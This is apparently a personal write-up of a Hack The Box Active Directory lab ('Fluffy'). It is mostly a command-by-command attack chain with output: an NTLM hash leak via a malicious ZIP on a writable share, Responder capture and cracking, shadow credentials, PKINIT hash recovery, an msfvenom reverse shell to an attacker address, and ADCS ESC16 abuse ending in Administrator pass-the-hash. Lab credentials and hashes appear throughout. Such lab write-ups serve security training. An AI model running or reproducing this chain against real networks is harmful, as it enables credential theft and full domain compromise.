

we start our pentest with provided creds : j.fleischman / J0elTHEM4n1990!

nmap 10.129.232.88 -A                                                                                                                                                                127 ↵
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-01 10:31 CET
Nmap scan report for DC01.fluffy.htb (10.129.232.88)
Host is up (0.16s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-01 16:30:57Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-04-01T16:32:27+00:00; +6h59m02s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2026-04-01T16:32:28+00:00; +6h59m02s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2026-04-01T16:32:27+00:00; +6h59m03s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2026-04-01T16:32:28+00:00; +6h59m02s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m02s, deviation: 0s, median: 6h59m01s
| smb2-time: 
|   date: 2026-04-01T16:31:47
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   159.88 ms 10.10.14.1
2   160.25 ms DC01.fluffy.htb (10.129.232.88)




+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
enum shares

netexec smb DC01.fluffy.htb -u j.fleischman -p  J0elTHEM4n1990! -M spider_plus --spider IT   C                                                                                         2 ↵
<SNIP>

SPIDER_PLUS 10.129.232.88   445    DC01             [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.129.232.88.json".
SPIDER_PLUS 10.129.232.88   445    DC01             [*] SMB Shares:           6 (ADMIN$, C$, IPC$, IT, NETLOGON, SYSVOL)
SPIDER_PLUS 10.129.232.88   445    DC01             [*] SMB Readable Shares:  4 (IPC$, IT, NETLOGON, SYSVOL)
SPIDER_PLUS 10.129.232.88   445    DC01             [*] SMB Writable Shares:  1 (IT)
SPIDER_PLUS 10.129.232.88   445    DC01             [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.232.88   445    DC01             [*] Total folders found:  27
SPIDER_PLUS 10.129.232.88   445    DC01             [*] Total files found:    26
SPIDER_PLUS 10.129.232.88   445    DC01             [*] File size average:    545.57 KB
SPIDER_PLUS 10.129.232.88   445    DC01             [*] File size min:        23 B
SPIDER_PLUS 10.129.232.88   445    DC01             [*] File size max:        3.15 MB
╭─kali@kali /usr/share/wordlists/seclists/Passwords 
╰─$ 
╭─kali@kali /usr/share/wordlists/seclists/Passwords 
╰─$ cat /home/kali/.nxc/modules/nxc_spider_plus/10.129.232.88.json                                     
{
    "IT": {
        "Everything-1.4.1.1026.x64.zip": {
       <SNIP>
        },
        "Upgrade_Notice.pdf": {
            "atime_epoch": "2025-05-17 15:31:07",
            "ctime_epoch": "2025-05-17 15:31:02",
            "mtime_epoch": "2025-05-17 15:31:07",
            "size": "165.98 KB"
        }
    },
    "NETLOGON": {},
    "SYSVOL": {
        "fluffy.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
            "atime_epoch": "2025-05-19 23:02:17",
            "ctime_epoch": "2025-04-17 16:59:25",
            "mtime_epoch": "2025-05-19 23:02:17",<SNIP>
            "mtime_epoch": "2025-05-19 22:43:31",
            "size": "552 B"
        }
    }
}%                              



the IT Share look intersting and in find a pdf file contiane Patch Announcement from infrastructure Department 
Vulnerabilities: 
CVE IDSeverity
CVE-2025-24996 Critical
CVE-2025-24071 Critical
CVE-2025-46785 High
CVE-2025-29968 High
CVE-2025-21193 Medium
CVE-2025-3445 Low




the CVE-2025-24071 look intersting : we will exploit it 
#   Windows Explorer automatically initiates an SMB authentication request when a
#   .library-ms file is extracted from a ZIP archive. This causes NTLM credentials
#   (in hashed format) to be leaked to a remote SMB server controlled by the attacker.
#   No user interaction is required beyond extraction. 

python PoC.py test <ATTACKER-IP>

then we will upload the zip file generated in the IT share since we have the writeable premittion on it 
╰─$ smbclient -U 'j.fleischman%J0elTHEM4n1990!' //DC01.fluffy.htb/IT

smb: \> put explpoit.zip
explpoit.zip does not exist


smb: \> put exploit.zip
putting file exploit.zip as \exploit.zip (0.6 kb/s) (average 0.3 kb/s)
smb: \> ls
  .                                   D        0  Thu Apr  2 03:37:44 2026
  ..                                  D        0  Thu Apr  2 03:37:44 2026
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 16:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 16:04:05 2025
  exploit.zip                         A      324  Thu Apr  2 03:37:44 2026
  KeePass-2.58                        D        0  Fri Apr 18 16:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 16:03:17 2025
  test.txt                            A        5  Thu Apr  2 03:34:18 2026
  Upgrade_Notice.pdf                  A   169963  Sat May 17 15:31:07 2025


then we will start responder to rogue authentication server for SMB protocol:

sudo responder -I tun0

[SMB] NTLMv2-SSP Client   : 10.129.232.88
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:cf59b405278375eb:CDD2F7FB63AA51F22EB257141DFD66C9:010100000000000080A68B1D17C2DC01FDB46DEFF6E970F10000000002000800430047003400490001001E00570049004E002D005100390033004B0030003300330050004C003000420004003400570049004E002D005100390033004B0030003300330050004C00300042002E0043004700340049002E004C004F00430041004C000300140043004700340049002E004C004F00430041004C000500140043004700340049002E004C004F00430041004C000700080080A68B1D17C2DC0106000400020000000800300030000000000000000100000000200000BA81843C6168C1E9A825A0D4020638AA02F7352C324FFEB01B9963160CE875800A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380032000000000000000000

ok we get our first user NetNTLMv2 and we will crack the hash with Hashcat Mode: 5600



hashcat -m 5600 NTLMv2-hash.txt /usr/share/wordlists/rockyou.txt

and we find the password for the user FLUFFY\p.agila is prometheusx-303 (fluffy.htb\p.agila:prometheusx-303)



from bloudhound we find  user have a GenericWrite priv over WINRM_SVC user so if we get compromise (via Shadow Credentials) this user we can  auth to winrm remotly 

P.AGILA
  └─(MemberOf)─► SERVICE ACCOUNT MANAGERS
                    └─(GenericAll)─► SERVICE ACCOUNTS 
                                        └─(GenericWrite)─► WINRM_SVC --> Remote Managemnt (login via winrm our foothold )

firstw we will add  our user to the SERVICE ACCOUNTS gorup
net rpc group addmem  "SERVICE ACCOUNTS" -U "fluffy.htb"/"p.agila"%"prometheusx-303" -S "10.129.232.88"

we will do shadow creds :
we need add public key in the user target 

/home/kali/tools/linux/AD/pywhisker/pywhisker/pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "WINRM_SVC" --action "add"                                    127 ↵
[*] Searching for the target account
[*] Target user found: CN=winrm service,CN=Users,DC=fluffy,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: f4759aef-e5b5-7ebd-c10e-5358d2bf1785
[*] Updating the msDS-KeyCredentialLink attribute of WINRM_SVC
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: BFzfKss0.pfx
[+] PFX exportiert nach: BFzfKss0.pfx
[i] Passwort für PFX: 20cM9zDyLRushbnwqKb7
[+] Saved PFX (#PKCS12) certificate & key at path: BFzfKss0.pfx
[*] Must be used with password: 20cM9zDyLRushbnwqKb7
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools

we will obtian the tgt for that user 
sudo ntpdate -q 10.129.232.88                                                                                                                                                        130 ↵
[sudo] password for kali: 
2026-04-02 19:13:45.775905 (+0100) +25133.924542 +/- 0.078145 10.129.232.88 s1 no-leap

faketime '+25133 sec' python gettgtpkinit.py -cert-pfx /home/kali/htb/cpts-prep/shadow/BFzfKss0.pfx -pfx-pass "20cM9zDyLRushbnwqKb7" fluffy.htb/WINRM_SVC ~/htb/cpts-prep/shadow/targetAccount.ccache 
2026-04-02 19:16:41,660 minikerberos INFO     Loading certificate and key from file
2026-04-02 19:16:41,810 minikerberos INFO     Requesting TGT
2026-04-02 19:17:06,295 minikerberos INFO     AS-REP encryption key (you might need this later):
2026-04-02 19:17:06,295 minikerberos INFO     6e0275cab7b9b880cac2e6bdeb1494cacbe0604eda6ae31a618787888d0d4fda
2026-04-02 19:17:06,307 minikerberos INFO     Saved TGT to file

we get our tgt tikcet + session key (to dycypte the PAC contine the NT hash)

export  KRB5CCNAME=/home/kali/htb/cpts-prep/shadow/targetAccount.ccache  # add our target tgt 

we can use this tgt to auth to with winrm :
sudo nano /etc/krb5.conf    # setting the domain first 
faketime '+25133 sec' evil-winrm -i DC01.fluffy.htb -u WINRM_SVC -r fluffy.htb
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> whoami
fluffy\winrm_svc



or we canget the ntlm hash for that user using the U2U to reqeuest a ticket for the our  user WINRM_SVC and we will decypt the pac with the  AS-REP encryption key
faketime '+25133 sec' getnthash.py fluffy.htb/WINRM_SVC -key 6e0275cab7b9b880cac2e6bdeb1494cacbe0604eda6ae31a618787888d0d4fda
Impacket v0.13.0.dev0+20250820.203717.835623ae - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
33bd09dcd697600edf6b3a7af4875767

ok we get the ntlm hash for the trget user WINRM_SVC

this user is belong to the remote managemnt so we can login with that user with winrm 


since the evil-winrm shell not stable we will creat a reverse shell with msfvenom 

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.243 LPORT=5555 -f psh-cmd 







compromise  the secoud user 

p.agila
    SERVICE ACCOUNTS Group
    └─► Shadow Creds on ca_svc → get ca_svc hash
            └─► Change ca_svc UPN to Administrator
                    └─► Request cert (now mapped to Admin)
                            └─
                              └─► Certipy auth → Admin hash
                                            └─► Evil-WinRM as Administrator 🎯



add our selfs again to the SERVICE ACCOUNTS
net rpc group addmem  "SERVICE ACCOUNTS" "p.agila"  -U "fluffy.htb"/"p.agila"%"prometheusx-303" -S "10.129.232.88"

Thne  we will compromis the server ca_svc via shado creds and get the hash of it 

/home/kali/tools/linux/AD/pywhisker/pywhisker/pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "ca_svc" --action "add"
[*] Searching for the target account
[*] Target user found: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 62b5c1b6-8329-b326-88dd-09cb27148016
[*] Updating the msDS-KeyCredentialLink attribute of ca_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: fJ2dAGSj.pfx
[+] PFX exportiert nach: fJ2dAGSj.pfx
[i] Passwort für PFX: rABvTfHFRh7PvKAegfcf
[+] Saved PFX (#PKCS12) certificate & key at path: fJ2dAGSj.pfx
[*] Must be used with password: rABvTfHFRh7PvKAegfcf
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools



faketime '+25133 sec' gettgtpkinit.py -cert-pfx /home/kali/htb/cpts-prep/fJ2dAGSj.pfx -pfx-pass "rABvTfHFRh7PvKAegfcf" fluffy.htb/CA_SVC ~/htb/cpts-prep/shadow/CA_SVC.ccache  
2026-04-03 16:52:45,852 minikerberos INFO     Loading certificate and key from file
2026-04-03 16:52:45,995 minikerberos INFO     Requesting TGT
2026-04-03 16:53:10,544 minikerberos INFO     AS-REP encryption key (you might need this later):
2026-04-03 16:53:10,544 minikerberos INFO     3b4ebf8a5be5cec7ebdf3cff099ec7cbe09ead953457f71b565e04d68587082d
2026-04-03 16:53:10,555 minikerberos INFO     Saved TGT to file /home/kali/htb/cpts-prep/shadow/CA_SVC.ccache


let get the nt hash 

faketime '+25133 sec' python getnthash.py fluffy.htb/CA_SVC -key 3b4ebf8a5be5cec7ebdf3cff099ec7cbe09ead953457f71b565e04d68587082d              130 ↵
Impacket v0.13.0.dev0+20250820.203717.835623ae - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
ca0f4f9e9eb8a092addf53bb03fc98c8

we get the CA_SVC user hash ca0f4f9e9eb8a092addf53bb03fc98c8
                            ca0f4f9e9eb8a092addf53bb03fc98c8
now we will login with it 
ca0f4f9e9eb8a092addf53bb03fc98c8


ca0f4f9e9eb8a092addf53bb03fc98c8


#########################################################################################################################
priv esc:

Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | Select ProductName, CurrentBuild, UBR, ReleaseId

ProductName                  CurrentBuild  UBR ReleaseId
-----------                  ------------  --- ---------
Windows Server 2019 Standard 17763        6893 1809

17763.6893

BuildLab                  : 17763.rs5_release.180914-1434



February 11, 2025—KB5052000 (OS Build 17763.6893) - EXPIRED




--------------------------------------------------------------------

now let check any Certs vluns 
first we add the tgt of the user CA_SVC
export KRB5CCNAME=/home/kali/htb/cpts-prep/shadow/CA_SVC.ccache 



then let start  check for any vlun in certs :

certipy-ad find -u 'p.agila' -p 'prometheusx-303' -dc-ip 10.129.232.88 -stdout -vulnerable # nothing here  

certipy-ad find -k -no-pass  -dc-ip 10.129.232.88 -target DC01.fluffy.htb -stdout -vulnerable  # vlun to ESC16: Security Extension Disabled on CA (Globally)





update the upn :

certipy-ad account -u 'p.agila' -p 'prometheusx-303' -dc-ip '10.129.232.88' -upn 'administrator' -user 'CA_SVC' update
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'




Authenticate using the obtained certificate.and req cer

 faketime '+25133 sec' certipy-ad req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip '10.129.232.88' -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'     130 ↵
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 19
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'administrator.pfx'


remove the spn from the target user 

certipy-ad account update -username "p.agila@fluffy.htb" -p "prometheusx-303" -user ca_svc -upn 'ca_svc@fluffy.htb'                                                                  130 ↵
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'




# , let's use the administrator.pfx certificate to get the RC4 hash of the Administrator user. 
faketime '+25133 sec' certipy-ad auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip 10.129.232.88                                                                               130 ↵
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
╭─kali@kali ~/htb/cpts-prep/i_am_the_god 
╰─$ 
╭─kali@kali ~/htb/cpts-prep/i_am_the_god 
╰─$ evil-winrm -i DC01.fluffy.htb -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e                                
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 







